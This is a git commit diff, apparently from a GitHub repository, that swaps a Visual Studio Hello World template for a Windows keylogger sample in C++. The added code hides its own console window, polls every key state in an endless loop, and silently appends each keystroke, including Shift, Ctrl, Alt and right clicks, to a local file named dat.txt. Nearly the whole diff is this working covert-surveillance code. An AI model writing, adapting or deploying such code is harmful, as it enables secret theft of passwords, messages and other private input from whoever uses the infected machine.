1087d1bb64dd84be30e9360f0b813f7e8d9611d8
DavidTesar <73195563+DavidTesar@users.noreply.github.com>
2021-12-04 01:15:28 -0600

    KeyLoggerSample
    Credit to: EgeBalci

--- KeyLogger/KeyLogger.cpp
+++ KeyLogger/KeyLogger.cpp
@@ -1,20 +1,111 @@
-// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
 #include <iostream>
+#include <fstream>
+
+using namespace std;
+
+void LOG(string input) {
+	fstream LogFile;
+	LogFile.open("dat.txt", fstream::app);
+	if (LogFile.is_open()) {
+		LogFile << input;
+		LogFile.close();
+	}
+}
+
+
+bool SpecialKeys(int S_Key) {
+	switch (S_Key) {
+	case VK_SPACE:
+		cout << " ";
+		LOG(" ");
+		return true;
+	case VK_RETURN:
+		cout << "\n";
+		LOG("\n");
+		return true;
+	case '¾':
+		cout << ".";
+		LOG(".");
+		return true;
+	case VK_SHIFT:
+		cout << "#SHIFT#";
+		LOG("#SHIFT#");
+		return true;
+	case VK_BACK:
+		cout << "\b";
+		LOG("\b");
+		return true;
+	case VK_RBUTTON:
+		cout << "#R_CLICK#";
+		LOG("#R_CLICK#");
+		return true;
+	case VK_CAPITAL:
+		cout << "#CAPS_LOCK#";
+		LOG("#CAPS_LCOK");
+		return true;
+	case VK_TAB:
+		cout << "#TAB";
+		LOG("#TAB");
+		return true;
+	case VK_UP:
+		cout << "#UP";
+		LOG("#UP_ARROW_KEY");
+		return true;
+	case VK_DOWN:
+		cout << "#DOWN";
+		LOG("#DOWN_ARROW_KEY");
+		return true;
+	case VK_LEFT:
+		cout << "#LEFT";
+		LOG("#LEFT_ARROW_KEY");
+		return true;
+	case VK_RIGHT:
+		cout << "#RIGHT";
+		LOG("#RIGHT_ARROW_KEY");
+		return true;
+	case VK_CONTROL:
+		cout << "#CONTROL";
+		LOG("#CONTROL");
+		return true;
+	case VK_MENU:
+		cout << "#ALT";
+		LOG("#ALT");
+		return true;
+	default:
+		return false;
+	}
+}
+
+
 
 int main()
 {
-    std::cout << "Hello World!\n";
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char KEY = 'x';
+
+	while (true) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+				if (SpecialKeys(KEY) == false) {
+
+					fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+					if (LogFile.is_open()) {
+						LogFile << char(KEY);
+						LogFile.close();
+					}
+
+				}
+			}
+		}
+	}
+
+	return 0;
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
